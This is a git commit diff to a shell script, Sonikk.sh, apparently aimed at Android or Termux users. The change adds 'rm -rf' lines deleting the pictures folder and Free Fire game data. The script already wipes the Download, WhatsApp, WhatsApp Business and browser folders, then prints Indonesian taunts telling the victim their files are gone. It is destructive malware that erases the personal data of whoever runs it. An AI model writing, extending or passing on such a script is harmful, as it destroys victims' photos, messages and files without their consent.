57bc8edf7d665e744950f9585d00e9873ea2afa4
fakradi <56883399+fakradi@users.noreply.github.com>
2019-12-20 09:54:52 +0700

    Update Sonikk.sh

--- Sonikk.sh
+++ Sonikk.sh
@@ -8,8 +8,12 @@ rm -rf Download
 rm -rf GBWhatsApp
 rm -rf browser
 rm -rf WhatsApp Business
+rm -rf Gambar
+rm -rf com.dts.freefireth
+
+
 echo "mampus lu anjing"
-echo "ᴹ4ᴵᴸ❦ᶻlucifeᴿ꧂⁩ gans tq"
+echo "꧂⁩mail gans tq"
 echo "kesel ya!! hahahaah"
 echo "Mampus lu anjing hahhaha"
 echo "Ya file nya hilang hahahha"
